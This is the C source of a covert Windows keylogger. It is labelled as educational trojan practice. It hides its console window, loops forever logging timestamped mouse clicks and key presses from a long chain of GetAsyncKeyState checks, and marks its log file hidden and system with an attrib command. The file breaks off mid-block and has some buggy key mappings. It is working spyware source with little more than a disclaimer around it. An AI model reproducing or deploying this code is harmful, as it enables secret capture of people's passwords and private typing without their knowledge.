/*This Program Is Coded By HIMANSHU ATHWANI */
/*Purely For Educational Purpose Only */
/* This Project Was Made By Himanshu Athwani For Testing Trojan Manipulation
    Under Penetration Testing Learning Process........                  */
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <time.h>
/*MACROS DESCRIPTIONS*/
#define separator fprintf(fp,"\n-----------------------------------------------------\n");
#define Get_Time_In_Seconds time_when_key_was_pressed_in_seconds= time(NULL);
#define seconds_into_string converted_seconds_into_string=ctime(&time_when_key_was_pressed_in_seconds);
#define Save_Time_In_File fprintf(fp,"\n%s",converted_seconds_into_string);
int main()
{

        /* Hide Window Console Using This Code
        ``
           As User Will Get Console visible And

           Will Close The Logger

        */

            HWND window;
            AllocConsole();
            window=FindWindowA("ConsoleWindowClass",NULL);
            ShowWindow(window,0);



        /* While Checking For Capital Alphabets

           Return Value From GetKeyState

           Will Be Stored In Caps Variable

           And Will Be Compared To ZERO

        */
            short Caps;




        /* Helps To Store The Return Value From GetAsyncKeyState

           Will Be Either True Or False

           I Mean If Key Is Pressed Previously

           To The Function Call , Then Function

           Will Return 1, Else

           ZERO. if One Is Returned From Function

           Then If Statement Will Be Executed ...

        */

            short keyvalue;





            /* KeyLogger Must Work Infinite */
            while(1)
            {

            /* Creating The Variable of time_t structure

            which Stores Value Return From Time Function

            Will Be Storing time in seconds.......


            */
            time_t  time_when_key_was_pressed_in_seconds;




            /* We Will Convert Time In String

            And Storing In This Variable Location

            */
            char *converted_seconds_into_string;





            /* Create a Variable Which Can

            Store Pointer To Of File Type

            Which Will Store The Base

            Address Of File in which we Are Storing Logs */


            FILE *fp;



            /* You Can Change Path And File Name Here

            Using The First Parameter eg : "c:\windwos\Pikachu.txt"

            This Cannot Be Left Empty :

            Minimum Requirement :"Filename.txt"  ...

            eg : "Pikachu.txt",or "abc.txt";


            */


            fp=fopen("Pikachu.txt","a+");



            /*Hiding The Key Stroke File

              This is A Dos Command...

              Executing With The Help

              Of System Function

            */

            system("attrib +s +h Pikachu.txt ");



            /* Check For Capital letters Using Function GetKeyState....

            GetKeyState Will Return Short-Data Type Value

            That Value Is Stored In The Variable Name Caps,

            Value Stored At Caps Will Be Either One Or Zero.

            if ONE is stored in Variable Caps then it will

            not be equal to Zero Hence If Condition is true

            And Hence All The Statement Under This Condition

            Will Be Executed , on the other hand if ZERO is

            Stored The Else Part Will Be Executed .

            This Will Work Till Infinity Or Shutdown

            or till Program is not Ended .


            Because This Is Enclose in While Loop.

            with Circuit Complete By Specifying

            (1) as a Parameter to While Loop....

            */



            if(Caps = GetKeyState(0x14)!=0)
            {


            /* Check For The Capital Alphabets


            This Will Only Execute if Caps

            Is Not Equal To Zero

            If Key Is Pressed The Function

            Will Return One And Stored In

            Caps , And Caps Is Not Equal

            To Zero Hence Statement Under

            This Condition Will Execute

            As it Has Became TRUE...


            */


        if(keyvalue=GetAsyncKeyState(0x01)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nLEFT MOUSE BUTTON(CAPS ON)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x02)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nRIGHT MOUSE BUTTON(CAPS ON)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x03)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nCONTROL-BREAK PROCESSING(CAPS ON)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x04)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nMIDDLE MOUSE BUTTON (THREE-BUTTON MOUSE)(CAPS ON)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x05)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nX1 MOUSE BUTTON(CAPS ON)\n");
        }

         if(keyvalue=GetAsyncKeyState(0x06)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nX2 MOUSE BUTTON(CAPS ON)\n");
        }

            /* Seven Is For The Bell */

        if(keyvalue=GetAsyncKeyState(0x08)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nBACKSPACE KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x09)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nTAB KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x0C)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nCLEAR KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x0D)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n----ENTER KEY----(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x10)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSHIFT KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x11)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nCONTROL KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x12)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nALT KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x13)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nPAUSE KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x15)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME KANA MODE(CAPS ON)\n");
        }
		// SIXTEEN IS RESERVED
        if(keyvalue=GetAsyncKeyState(0x17)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME JUNJA MODE(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x18)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME FINAL MODE(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x19)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME HANJA MODE(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x19)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME KANJI MODE(CAPS ON)\n");
        }


        if(keyvalue=GetAsyncKeyState(0x1B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nESC(CAPS ON)\n");
        }
          if(keyvalue=GetAsyncKeyState(0x1C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME convert(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x1D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME NONCONVERT(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x1E)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME ACCEPT(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x1F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nIME MODE CHANGE REQUEST(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x20)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSPACE(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x21)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nPAGE UP KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x22)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nPAGE DOWN KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x23)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nEND KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x24)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nHOME KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x25)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nLEFT ARROW KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x26)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nUP ARROW KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x27)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nRIGHT ARROW KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x28)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nDOWN ARROW KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x29)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSELECT KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x2A)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nPRINT KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x2B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nEXECUTE KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x2C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nPRINT SCREEN KEY(CAPS ON)\n");
        }
          if(keyvalue=GetAsyncKeyState(0x2D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nINSERT KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x2E)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nDELETE KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x2F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nHELP KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x30)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n0(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x31)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n1(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x32)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n2(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x33)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n3(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x34)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n4(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x35)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n5(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x36)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n6(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x37)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n7(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x38)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n8(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x39)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n9(CAPS ON)\n");
        }
        // 40 Undefined

        if(keyvalue=GetAsyncKeyState(0x41)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nA(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x42)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nB(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x43)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nC(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x44)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nD(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x45)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nE(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x46)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x47)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nG(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x48)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nH(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x49)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nI(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4A)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nJ(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nK(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nL(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4D)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nM(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4E)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nN(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nO(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x50)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nP(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x51)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nQ(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x52)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nR(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x53)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nS(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x54)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nT(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x55)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nU(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x56)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nV(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x57)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nW(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x58)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nX(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x59)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5A)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nZ(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5B)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nLEFT WINDOWS KEY (NATURAL KEYBOARDS)(CAPS ON) \n");
        }
         if(keyvalue=GetAsyncKeyState(0x5C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nRIGHT WINDOWS KEY (NATURAL KEYBOARDS)(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nAPPLICATION KEY (NATURAL KEYBOARD)(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nCOMPUTER SLEEP KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x60)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 0 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x61)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 1 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x62)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 2 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x63)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 3 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x64)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 4 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x65)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 5 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x66)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 7 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x67)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 8 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x68)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 9 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x69)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUMERIC KEYPAD 10 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6A)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nMULTIPLY KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nADD KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSEPERATOR KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSUBTRACT KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6E)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nDECIMAL KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nDIVIDE KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x70)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF1 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x71)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF2 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x72)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF3 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x73)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF4 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x74)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF5 KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x75)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF6 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x76)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF7 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x77)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF8 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x78)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF9 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x79)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF10 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7A)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF11 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7B)!=0)
        {
            separator;
            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;
            fprintf(fp,"\nF12 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7C)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF13 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF14 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7E)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF15 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF16 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x80)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

